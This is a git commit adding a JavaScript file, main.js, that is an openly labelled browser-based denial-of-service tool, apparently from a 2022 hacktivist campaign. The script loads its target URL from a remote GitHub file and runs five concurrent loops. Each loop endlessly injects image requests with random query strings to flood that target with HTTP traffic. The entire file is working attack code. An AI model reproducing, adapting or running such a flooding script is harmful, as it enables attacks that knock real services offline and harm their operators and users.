93855168cbefaba414e6ffa40392a5fa75577a13
OpKremlin <100879728+OpKremlin@users.noreply.github.com>
2022-03-03 21:40:28 +0000

    Create main.js

---
+++ main.js
@@ -0,0 +1,47 @@
+var dest = "";
+    var concAttack = 5;
+    var attackCount = 0;
+
+    // Load Destination of attack
+    $.get( "https://raw.githubusercontent.com/OpRuSS/Op1/main/destination.txt", function( data ) {
+        console.log('Destination Loaded: '+data);
+        dest = data;
+        $("#StartAttack").show();
+    });
+
+    //  //  //  //  //
+    // Click to start attack
+    $( "#StartAttack" ).click(function() {
+        // Get value of thr.
+        $( "#concAttack" )
+        //console.log('Attack Started');
+        // Multiple Attack same Time
+        for (let index = 0; index < concAttack; index++) {
+            startAttack();
+        }
+    });
+
+    //  //  //  //  //  //  //
+    // Attack Function
+    function startAttack(idImg) {
+        // Generate Random Number
+        var rand = ~~( Math.random() * 99999 ) + 1;
+        // Increase Attack Counter
+        attackCount++;
+        // Create random ID
+        var idImg = new Date().getTime() +'_'+ rand;
+        // Load Image
+        $('#attackBoard').prepend('<img class="imgAtk" id="'+idImg+'" src="'+dest+'?idImg='+idImg+'" width="50" height="50" />');
+        // Execution function after load
+        $( "#"+idImg ).one("load", function() {
+            // Clear Loaded Image
+            $(this).remove();
+            //Attack Counter:
+            $("#atkP").html(attackCount);
+            startAttack();
+        }).each(function() {
+            if(this.complete) {
+                $(this).trigger('load');
+            }
+        });
+    }
